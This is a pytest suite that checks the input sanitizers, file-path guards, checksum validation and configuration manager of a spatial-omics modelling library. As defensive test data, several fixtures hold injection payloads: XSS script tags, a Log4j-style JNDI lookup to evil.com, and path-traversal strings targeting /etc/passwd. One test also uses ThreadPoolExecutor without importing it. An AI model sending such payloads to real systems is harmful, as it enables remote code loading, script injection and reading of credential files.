"""
Comprehensive robustness tests for Spatial-Omics GFM.
Tests validation, security, error handling, and recovery mechanisms.
"""

import pytest
import numpy as np
import pandas as pd
import torch
from anndata import AnnData
from pathlib import Path
import tempfile
import json
import yaml
from unittest.mock import Mock, patch
import threading
import time
from hypothesis import given, strategies as st, settings

from spatial_omics_gfm.utils.enhanced_validators import (
    RobustValidator, ValidationConfig, ValidationResult, ValidationException,
    DataIntegrityValidator, AdversarialInputDetector, FilePathSanitizer
)
from spatial_omics_gfm.utils.security import (
    SecurityConfig, InputSanitizer, SecureFileHandler, ModelSecurity
)
from spatial_omics_gfm.utils.config_manager import (
    ConfigManager, ExperimentConfig, ModelConfig, TrainingConfig,
    ConfigValidationError, ConfigUpdateError
)


class TestRobustValidation:
    """Test suite for robust validation system."""
    
    @pytest.fixture
    def validation_config(self):
        """Test validation configuration."""
        return ValidationConfig(
            strict_mode=False,
            auto_fix=True,
            max_warnings=50,
            validation_timeout=30
        )
    
    @pytest.fixture
    def robust_validator(self, validation_config):
        """Robust validator instance."""
        return RobustValidator(validation_config)
    
    @pytest.fixture
    def corrupted_adata(self):
        """AnnData with various corruption patterns."""
        n_obs, n_vars = 100, 50
        
        # Create corrupted expression matrix
        X = np.random.negative_binomial(5, 0.3, size=(n_obs, n_vars)).astype(np.float32)
        
        # Introduce corruption patterns
        X[0:10, :] = X[0, :]  # Identical rows
        X[:, 0:5] = X[:, 0:1]  # Identical columns
        X[20:25, 10:15] = np.nan  # NaN values
        X[30:35, 15:20] = np.inf  # Infinite values
        X[40, :] = 0  # All-zero row
        
        obs = pd.DataFrame({
            'cell_id': [f'Cell_{i}' for i in range(n_obs)],
            'suspicious_field': ['<script>alert("xss")</script>'] * n_obs,  # Suspicious content
            'long_field': ['x' * 2000] * n_obs  # Overly long field
        })
        obs.index = [f"Cell_{i}" for i in range(n_obs)]
        
        var = pd.DataFrame({
            'gene_name': [f'Gene_{i}' for i in range(n_vars)],
            'path_traversal': ['../../etc/passwd'] * n_vars  # Path traversal attempt
        })
        var.index = [f"ENSG{i:08d}" for i in range(n_vars)]
        
        adata = AnnData(X=X, obs=obs, var=var)
        adata.obsm['spatial'] = np.random.uniform(0, 100, (n_obs, 2))
        
        return adata
    
    def test_basic_validation_functionality(self, robust_validator, sample_adata):
        """Test basic validation functionality."""
        result = robust_validator.validate_spatial_data_robust(sample_adata)
        
        assert isinstance(result, ValidationResult)
        assert 'validator_version' in result.validation_metadata
        assert 'validation_start_time' in result.validation_metadata
        assert result.performance_stats['validation_duration_seconds'] >= 0
    
    def test_corruption_detection(self, robust_validator, corrupted_adata):
        """Test detection of data corruption patterns."""
        result = robust_validator.validate_spatial_data_robust(corrupted_adata)
        
        # Should detect various corruption patterns
        warning_codes = [w['warning_code'] for w in result.warnings]
        
        assert 'DATA_CORRUPTION_REPEATED' in warning_codes
        assert 'ADVERSARIAL_PATTERN' in warning_codes or 'ADVERSARIAL_LONG_STRING' in warning_codes
    
    def test_adversarial_input_detection(self, robust_validator):
        """Test detection of adversarial inputs."""
        # Create adversarial data
        n_obs, n_vars = 50, 25
        X = np.random.rand(n_obs, n_vars)
        
        obs = pd.DataFrame({
            'evil_field': ['${jndi:ldap://evil.com/a}'] * n_obs,  # Log4j-style injection
            'script_tag': ['<script>alert(1)</script>'] * n_obs   # XSS attempt
        })
        obs.index = [f"Cell_{i}" for i in range(n_obs)]
        
        var = pd.DataFrame(index=[f"Gene_{i}" for i in range(n_vars)])
        
        adata = AnnData(X=X, obs=obs, var=var)
        adata.obsm['spatial'] = np.random.uniform(0, 100, (n_obs, 2))
        
        result = robust_validator.validate_spatial_data_robust(adata)
        
        # Should detect adversarial patterns
        warning_codes = [w['warning_code'] for w in result.warnings]
        assert any('ADVERSARIAL' in code for code in warning_codes)
    
    def test_validation_timeout(self, validation_config):
        """Test validation timeout functionality."""
        validation_config.validation_timeout = 1  # 1 second timeout
        validator = RobustValidator(validation_config)
        
        # Create large dataset that might cause timeout
        n_obs, n_vars = 10000, 5000
        X = np.random.rand(n_obs, n_vars)
        obs = pd.DataFrame(index=[f"Cell_{i}" for i in range(n_obs)])
        var = pd.DataFrame(index=[f"Gene_{i}" for i in range(n_vars)])
        
        large_adata = AnnData(X=X, obs=obs, var=var)
        large_adata.obsm['spatial'] = np.random.uniform(0, 100, (n_obs, 2))
        
        # This might timeout depending on system performance
        # The test passes if either validation completes or times out gracefully
        try:
            result = validator.validate_spatial_data_robust(large_adata)
            assert isinstance(result, ValidationResult)
        except ValidationException as e:
            assert 'timeout' in str(e).lower()
    
    def test_file_path_validation_security(self, robust_validator, temp_dir):
        """Test file path security validation."""
        # Test dangerous paths
        dangerous_paths = [
            '../../../etc/passwd',
            '/etc/passwd',
            'C:\\Windows\\System32',
            '..\\..\\evil.exe',
            'file_with_\x00_null.h5ad'
        ]
        
        for dangerous_path in dangerous_paths:
            test_file = temp_dir / "test.h5ad"
            # Create a dummy file
            AnnData(np.random.rand(10, 5)).write_h5ad(test_file)
            
            with pytest.raises(ValidationException):
                robust_validator.validate_spatial_data_robust(
                    AnnData(np.random.rand(5, 3)),
                    file_path=dangerous_path
                )
    
    def test_data_integrity_validation(self, robust_validator, sample_adata):
        """Test data integrity validation with checksums."""
        integrity_validator = DataIntegrityValidator()
        
        # Compute checksum
        original_checksum = integrity_validator.compute_data_checksum(sample_adata)
        
        # Validate with correct checksum
        result = robust_validator.validate_spatial_data_robust(
            sample_adata, 
            expected_checksum=original_checksum
        )
        
        # Should pass integrity check
        error_codes = [e['error_code'] for e in result.errors]
        assert 'DATA_INTEGRITY_MISMATCH' not in error_codes
        
        # Validate with incorrect checksum
        wrong_checksum = "0" * 64  # Invalid checksum
        result = robust_validator.validate_spatial_data_robust(
            sample_adata,
            expected_checksum=wrong_checksum
        )
        
        # Should fail integrity check
        error_codes = [e['error_code'] for e in result.errors]
        assert 'DATA_INTEGRITY_MISMATCH' in error_codes
    
    def test_validation_result_serialization(self, robust_validator, sample_adata):
        """Test validation result serialization."""
        result = robust_validator.validate_spatial_data_robust(sample_adata)
        
        # Test dictionary conversion
        result_dict = result.to_dict()
        assert isinstance(result_dict, dict)
        assert 'is_valid' in result_dict
        assert 'errors' in result_dict
        assert 'warnings' in result_dict
        
        # Test JSON serialization
        json_str = result.to_json()
        assert isinstance(json_str, str)
        
        # Should be valid JSON
        parsed = json.loads(json_str)
        assert parsed['is_valid'] == result.is_valid


class TestSecurityFeatures:
    """Test suite for security features."""
    
    @pytest.fixture
    def security_config(self):
        """Security configuration for testing."""
        return SecurityConfig(
            max_file_size_mb=10,
            enable_model_signing=True,
            max_string_length=100
        )
    
    @pytest.fixture
    def input_sanitizer(self, security_config):
        """Input sanitizer instance."""
        return InputSanitizer(security_config)
    
    @pytest.fixture
    def secure_file_handler(self, security_config):
        """Secure file handler instance."""
        return SecureFileHandler(security_config)
    
    def test_string_sanitization(self, input_sanitizer):
        """Test string input sanitization."""
        # Test basic sanitization
        clean_string = input_sanitizer.sanitize_string("Hello World", "general")
        assert clean_string == "Hello World"
        
        # Test length limiting
        long_string = "x" * 2000
        sanitized = input_sanitizer.sanitize_string(long_string, "general")
        assert len(sanitized) <= 100
        
        # Test control character removal
        dirty_string = "Hello\x00\x01World\x1f"
        sanitized = input_sanitizer.sanitize_string(dirty_string, "general")
        assert '\x00' not in sanitized
        assert '\x01' not in sanitized
        assert '\x1f' not in sanitized
    
    def test_filename_sanitization(self, input_sanitizer):
        """Test filename sanitization."""
        # Test dangerous filename characters
        dangerous_name = 'file<>:"|?*.txt'
        sanitized = input_sanitizer.sanitize_string(dangerous_name, "filename")
        assert '<' not in sanitized
        assert '>' not in sanitized
        assert '|' not in sanitized
        
        # Test path traversal detection
        with pytest.raises(ValueError):
            input_sanitizer.sanitize_string("../../../etc/passwd", "filename")
    
    def test_dictionary_sanitization(self, input_sanitizer):
        """Test dictionary sanitization."""
        dirty_dict = {
            'normal_key': 'normal_value',
            'evil_key<script>': 'evil_value${jndi:ldap://hack}',
            'nested': {
                'level2': 'value',
                'evil_nested': '<img src=x onerror=alert(1)>'
            },
            'list_field': ['item1', '<script>alert(2)</script>', 'item3']
        }
        
        sanitized = input_sanitizer.sanitize_dict(dirty_dict)
        
        # Check that dangerous content is removed or sanitized
        assert 'normal_key' in sanitized
        assert sanitized['normal_key'] == 'normal_value'
        
        # Nested dictionary should be sanitized
        assert 'nested' in sanitized
        assert isinstance(sanitized['nested'], dict)
    
    def test_file_path_security(self, secure_file_handler, temp_dir):
        """Test secure file path handling."""
        # Create test file
        test_file = temp_dir / "test.h5ad"
        AnnData(np.random.rand(10, 5)).write_h5ad(test_file)
        
        # Test valid path
        safe_path = secure_file_handler.sanitizer.sanitize_file_path(test_file, temp_dir)
        assert safe_path == test_file.resolve()
        
        # Test path outside base directory
        outside_file = temp_dir.parent / "outside.h5ad"
        with pytest.raises(ValueError):
            secure_file_handler.sanitizer.sanitize_file_path(outside_file, temp_dir)
    
    def test_file_size_validation(self, secure_file_handler, temp_dir):
        """Test file size validation."""
        # Create small file (should pass)
        small_file = temp_dir / "small.h5ad"
        AnnData(np.random.rand(5, 3)).write_h5ad(small_file)
        
        assert secure_file_handler.validate_file_size(small_file)
        
        # Create large file (should fail) - simulate by checking config
        # This test verifies the validation logic without creating huge files
        handler_with_small_limit = SecureFileHandler(SecurityConfig(max_file_size_mb=0.001))
        
        with pytest.raises(ValueError, match="exceeds limit"):
            handler_with_small_limit.validate_file_size(small_file)
    
    def test_checksum_validation(self, secure_file_handler, temp_dir):
        """Test file checksum computation and verification."""
        # Create test file
        test_file = temp_dir / "test.h5ad"
        AnnData(np.random.rand(10, 5)).write_h5ad(test_file)
        
        # Compute checksum
        checksum = secure_file_handler.compute_file_checksum(test_file)
        assert isinstance(checksum, str)
        assert len(checksum) == 64  # SHA256 hex string
        
        # Verify correct checksum
        assert secure_file_handler.verify_file_integrity(test_file, checksum)
        
        # Verify incorrect checksum
        wrong_checksum = "0" * 64
        assert not secure_file_handler.verify_file_integrity(test_file, wrong_checksum)
    
    def test_secure_data_loading(self, secure_file_handler, temp_dir):
        """Test secure data loading."""
        # Create test data file
        test_adata = AnnData(np.random.rand(20, 10))
        test_adata.obsm['spatial'] = np.random.rand(20, 2)
        test_adata.obs['metadata'] = ['clean_value'] * 20
        
        test_file = temp_dir / "secure_test.h5ad"
        test_adata.write_h5ad(test_file)
        
        # Load securely
        loaded_adata = secure_file_handler.load_data_securely(test_file, temp_dir)
        
        assert isinstance(loaded_adata, AnnData)
        assert loaded_adata.shape == test_adata.shape
        assert 'spatial' in loaded_adata.obsm


class TestConfigurationManagement:
    """Test suite for configuration management."""
    
    @pytest.fixture
    def config_manager(self):
        """Configuration manager instance."""
        return ConfigManager()
    
    @pytest.fixture
    def sample_config_dict(self):
        """Sample configuration dictionary."""
        return {
            'name': 'test_experiment',
            'description': 'Test configuration',
            'model': {
                'num_genes': 1000,
                'hidden_dim': 512,
                'num_layers': 12,
                'num_heads': 8
            },
            'training': {
                'batch_size': 64,
                'learning_rate': 0.001,
                'max_epochs': 50
            },
            'system': {
                'device': 'cuda',
                'num_workers': 8,
                'memory_limit_gb': 32.0
            }
        }
    
    def test_config_creation_and_validation(self, config_manager, sample_config_dict):
        """Test configuration creation and validation."""
        # Create configuration
        config = ExperimentConfig(**sample_config_dict)
        
        assert config.name == 'test_experiment'
        assert config.model.num_genes == 1000
        assert config.model.hidden_dim == 512
        assert config.training.batch_size == 64
    
    def test_config_file_loading(self, config_manager, sample_config_dict, temp_dir):
        """Test loading configuration from YAML and JSON files."""
        # Test YAML loading
        yaml_file = temp_dir / "config.yaml"
        with open(yaml_file, 'w') as f:
            yaml.dump(sample_config_dict, f)
        
        config = config_manager.load_config(yaml_file)
        assert config.name == 'test_experiment'
        assert config.model.hidden_dim == 512
        
        # Test JSON loading
        json_file = temp_dir / "config.json"
        with open(json_file, 'w') as f:
            json.dump(sample_config_dict, f)
        
        config = config_manager.load_config(json_file)
        assert config.name == 'test_experiment'
        assert config.model.hidden_dim == 512
    
    def test_environment_variable_overrides(self, config_manager, sample_config_dict, temp_dir):
        """Test configuration override with environment variables."""
        # Create config file
        yaml_file = temp_dir / "config.yaml"
        with open(yaml_file, 'w') as f:
            yaml.dump(sample_config_dict, f)
        
        # Set environment variables
        import os
        original_env = os.environ.copy()
        
        try:
            os.environ['SPATIAL_GFM_MODEL_HIDDEN_DIM'] = '1024'
            os.environ['SPATIAL_GFM_TRAINING_BATCH_SIZE'] = '128'
            os.environ['SPATIAL_GFM_SYSTEM_DEVICE'] = 'cpu'
            
            config = config_manager.load_config(yaml_file, override_with_env=True)
            
            # Check that environment variables override file values
            assert config.model.hidden_dim == 1024
            assert config.training.batch_size == 128
            assert config.system.device == 'cpu'
            
        finally:
            # Restore environment
            os.environ.clear()
            os.environ.update(original_env)
    
    def test_config_updating(self, config_manager, sample_config_dict):
        """Test runtime configuration updates."""
        # Load initial config
        config = ExperimentConfig(**sample_config_dict)
        config_manager.config = config
        
        # Update configuration
        updates = {
            'model': {
                'hidden_dim': 2048,
                'num_layers': 24
            },
            'training': {
                'learning_rate': 0.0001
            }
        }
        
        config_manager.update_config(updates)
        
        # Check updates were applied
        updated_config = config_manager.get_config()
        assert updated_config.model.hidden_dim == 2048
        assert updated_config.model.num_layers == 24
        assert updated_config.training.learning_rate == 0.0001
        
        # Check that other values weren't changed
        assert updated_config.model.num_genes == 1000  # Original value
        assert updated_config.training.batch_size == 64  # Original value
    
    def test_config_validation(self, config_manager):
        """Test configuration validation."""
        # Valid configuration
        valid_config = ExperimentConfig(
            name="valid_test",
            model=ModelConfig(num_genes=1000, hidden_dim=512, num_heads=8),
            training=TrainingConfig(batch_size=32, learning_rate=0.001)
        )
        
        config_manager.config = valid_config
        validation_report = config_manager.validate_config()
        assert validation_report['valid'] is True
        
        # Invalid configuration (hidden_dim not divisible by num_heads)
        invalid_config = ExperimentConfig(
            name="invalid_test",
            model=ModelConfig(num_genes=1000, hidden_dim=500, num_heads=8),  # 500 not divisible by 8
            training=TrainingConfig(batch_size=32, learning_rate=0.001)
        )
        
        config_manager.config = invalid_config
        validation_report = config_manager.validate_config()
        assert validation_report['valid'] is False
        assert len(validation_report['errors']) > 0
    
    def test_config_history_and_rollback(self, config_manager, sample_config_dict):
        """Test configuration history and rollback functionality."""
        # Load initial config
        initial_config = ExperimentConfig(**sample_config_dict)
        config_manager.config = initial_config
        
        # Make first update
        config_manager.update_config({'model': {'hidden_dim': 1024}})
        
        # Make second update
        config_manager.update_config({'model': {'num_layers': 36}})
        
        # Check current state
        current_config = config_manager.get_config()
        assert current_config.model.hidden_dim == 1024
        assert current_config.model.num_layers == 36
        
        # Rollback one step
        config_manager.rollback_config(1)
        
        rollback_config = config_manager.get_config()
        assert rollback_config.model.hidden_dim == 1024
        assert rollback_config.model.num_layers == 12  # Original value
        
        # Rollback to initial
        config_manager.rollback_config(1)
        
        initial_rollback = config_manager.get_config()
        assert initial_rollback.model.hidden_dim == 512  # Original value
    
    def test_temporary_config_context(self, config_manager, sample_config_dict):
        """Test temporary configuration context manager."""
        # Load initial config
        initial_config = ExperimentConfig(**sample_config_dict)
        config_manager.config = initial_config
        
        original_hidden_dim = initial_config.model.hidden_dim
        
        # Use temporary config
        with config_manager.temporary_config({'model': {'hidden_dim': 2048}}):
            temp_config = config_manager.get_config()
            assert temp_config.model.hidden_dim == 2048
        
        # Should revert to original
        final_config = config_manager.get_config()
        assert final_config.model.hidden_dim == original_hidden_dim


class TestPropertyBasedTesting:
    """Property-based tests using Hypothesis."""
    
    @given(
        n_obs=st.integers(min_value=10, max_value=1000),
        n_vars=st.integers(min_value=5, max_value=500),
        spatial_dim=st.integers(min_value=2, max_value=3)
    )
    @settings(max_examples=20, deadline=30000)
    def test_validation_handles_arbitrary_data_sizes(self, n_obs, n_vars, spatial_dim):
        """Test that validation works with arbitrary data sizes."""
        # Create random data with given dimensions
        X = np.random.negative_binomial(3, 0.3, size=(n_obs, n_vars)).astype(np.float32)
        
        obs = pd.DataFrame(index=[f"Cell_{i}" for i in range(n_obs)])
        var = pd.DataFrame(index=[f"Gene_{i}" for i in range(n_vars)])
        
        adata = AnnData(X=X, obs=obs, var=var)
        adata.obsm['spatial'] = np.random.uniform(0, 1000, (n_obs, spatial_dim))
        
        # Validation should complete without errors
        validator = RobustValidator()
        result = validator.validate_spatial_data_robust(adata)
        
        assert isinstance(result, ValidationResult)
        assert result.validation_metadata['data_shape'] == (n_obs, n_vars)
    
    @given(
        hidden_dim=st.integers(min_value=64, max_value=4096),
        num_heads=st.integers(min_value=1, max_value=32)
    )
    @settings(max_examples=50)
    def test_model_config_validation_properties(self, hidden_dim, num_heads):
        """Test model configuration validation properties."""
        # If hidden_dim is divisible by num_heads, config should be valid
        if hidden_dim % num_heads == 0:
            try:
                config = ModelConfig(
                    num_genes=1000,
                    hidden_dim=hidden_dim,
                    num_heads=num_heads
                )
                # Should not raise exception
                assert config.hidden_dim == hidden_dim
                assert config.num_heads == num_heads
            except Exception:
                pytest.fail("Valid configuration was rejected")
        else:
            # Should raise validation error
            with pytest.raises(ValueError):
                ModelConfig(
                    num_genes=1000,
                    hidden_dim=hidden_dim,
                    num_heads=num_heads
                )
    
    @given(st.text(min_size=1, max_size=2000))
    @settings(max_examples=100)
    def test_string_sanitization_properties(self, input_string):
        """Test string sanitization properties."""
        sanitizer = InputSanitizer(SecurityConfig())
        
        try:
            sanitized = sanitizer.sanitize_string(input_string, "general")
            
            # Properties that should always hold:
            # 1. Output should be a string
            assert isinstance(sanitized, str)
            
            # 2. Length should not exceed limit
            assert len(sanitized) <= sanitizer.config.max_string_length
            
            # 3. Should not contain control characters (except whitespace)
            for char in sanitized:
                assert ord(char) >= 32 or char in '\t\n\r'
            
        except Exception as e:
            # If sanitization fails, it should be for a good reason
            assert isinstance(e, (ValueError, TypeError))


class TestConcurrencyAndThreadSafety:
    """Test suite for concurrency and thread safety."""
    
    def test_config_manager_thread_safety(self, sample_config_dict):
        """Test configuration manager thread safety."""
        config_manager = ConfigManager()
        config_manager.config = ExperimentConfig(**sample_config_dict)
        
        errors = []
        results = []
        
        def update_config(thread_id):
            try:
                updates = {
                    'model': {'hidden_dim': 512 + thread_id * 64},
                    'training': {'batch_size': 32 + thread_id}
                }
                config_manager.update_config(updates)
                results.append(thread_id)
            except Exception as e:
                errors.append(e)
        
        # Create multiple threads
        threads = []
        for i in range(10):
            thread = threading.Thread(target=update_config, args=(i,))
            threads.append(thread)
        
        # Start all threads
        for thread in threads:
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # Should not have any errors
        assert not errors
        
        # All threads should have completed
        assert len(results) == 10
    
    def test_validation_thread_safety(self):
        """Test validator thread safety."""
        validator = RobustValidator()
        
        def validate_data(thread_id):
            # Create thread-specific data
            n_obs, n_vars = 50, 25
            X = np.random.rand(n_obs, n_vars)
            obs = pd.DataFrame(index=[f"Cell_{thread_id}_{i}" for i in range(n_obs)])
            var = pd.DataFrame(index=[f"Gene_{i}" for i in range(n_vars)])
            
            adata = AnnData(X=X, obs=obs, var=var)
            adata.obsm['spatial'] = np.random.rand(n_obs, 2)
            
            result = validator.validate_spatial_data_robust(adata)
            return result.is_valid
        
        # Run validation in multiple threads
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(validate_data, i) for i in range(10)]
            results = [future.result() for future in futures]
        
        # All validations should complete
        assert len(results) == 10
        assert all(isinstance(result, bool) for result in results)


class TestErrorRecoveryMechanisms:
    """Test suite for error recovery mechanisms."""
    
    def test_nan_value_recovery(self):
        """Test recovery from NaN values in data."""
        # Create data with NaN values
        n_obs, n_vars = 100, 50
        X = np.random.rand(n_obs, n_vars)
        X[10:20, 5:15] = np.nan  # Insert NaN values
        
        obs = pd.DataFrame(index=[f"Cell_{i}" for i in range(n_obs)])
        var = pd.DataFrame(index=[f"Gene_{i}" for i in range(n_vars)])
        
        adata = AnnData(X=X, obs=obs, var=var)
        adata.obsm['spatial'] = np.random.rand(n_obs, 2)
        
        # Validate with auto-fix enabled
        config = ValidationConfig(auto_fix=True)
        validator = RobustValidator(config)
        
        result = validator.validate_spatial_data_robust(adata)
        
        # Should have attempted fixes
        assert len(result.fixes_applied) > 0
        fix_types = [fix['fix_type'] for fix in result.fixes_applied]
        assert any('STANDARD_FIX' in fix_type for fix_type in fix_types)
    
    def test_graceful_failure_handling(self):
        """Test graceful handling of unrecoverable errors."""
        validator = RobustValidator()
        
        # Create invalid data that should cause validation to fail gracefully
        invalid_adata = Mock()
        invalid_adata.shape = (0, 0)  # Invalid shape
        invalid_adata.X = None  # No expression matrix
        
        # Should not crash, but return error result
        result = validator.validate_spatial_data_robust(invalid_adata)
        
        assert isinstance(result, ValidationResult)
        assert not result.is_valid
        assert len(result.errors) > 0


class TestIntegrationScenarios:
    """Integration tests for complete workflows."""
    
    def test_end_to_end_robust_pipeline(self, temp_dir):
        """Test complete robust validation pipeline."""
        # 1. Create configuration
        config_manager = ConfigManager()
        config = ExperimentConfig(
            name="integration_test",
            model=ModelConfig(num_genes=100, hidden_dim=256, num_heads=8),
            training=TrainingConfig(batch_size=16, learning_rate=0.001),
            security=SecurityConfig(enable_input_validation=True, max_file_size_mb=10)
        )
        config_manager.config = config
        
        # 2. Create test data
        n_obs, n_vars = 200, 100
        X = np.random.negative_binomial(5, 0.3, size=(n_obs, n_vars)).astype(np.float32)
        
        obs = pd.DataFrame({
            'cell_type': np.random.choice(['TypeA', 'TypeB'], n_obs),
            'batch': np.random.choice([1, 2], n_obs)
        })
        obs.index = [f"Cell_{i}" for i in range(n_obs)]
        
        var = pd.DataFrame({
            'gene_name': [f'Gene_{i}' for i in range(n_vars)],
            'highly_variable': np.random.choice([True, False], n_vars)
        })
        var.index = [f"ENSG{i:08d}" for i in range(n_vars)]
        
        adata = AnnData(X=X, obs=obs, var=var)
        adata.obsm['spatial'] = np.random.uniform(0, 1000, (n_obs, 2))
        
        # 3. Save data securely
        data_file = temp_dir / "integration_test.h5ad"
        adata.write_h5ad(data_file)
        
        # 4. Load and validate with full robustness pipeline
        security_config = SecurityConfig()
        file_handler = SecureFileHandler(security_config)
        
        # Load securely
        loaded_adata = file_handler.load_data_securely(data_file, temp_dir)
        
        # Validate robustly
        validator = RobustValidator(ValidationConfig(auto_fix=True))
        validation_result = validator.validate_spatial_data_robust(
            loaded_adata, 
            file_path=data_file
        )
        
        # 5. Verify results
        assert isinstance(validation_result, ValidationResult)
        assert 'validator_version' in validation_result.validation_metadata
        assert validation_result.performance_stats['validation_duration_seconds'] >= 0
        
        # Data should be valid or have recoverable issues
        if not validation_result.is_valid:
            # If invalid, should have attempted fixes
            assert len(validation_result.fixes_applied) > 0 or validation_result.config.auto_fix is False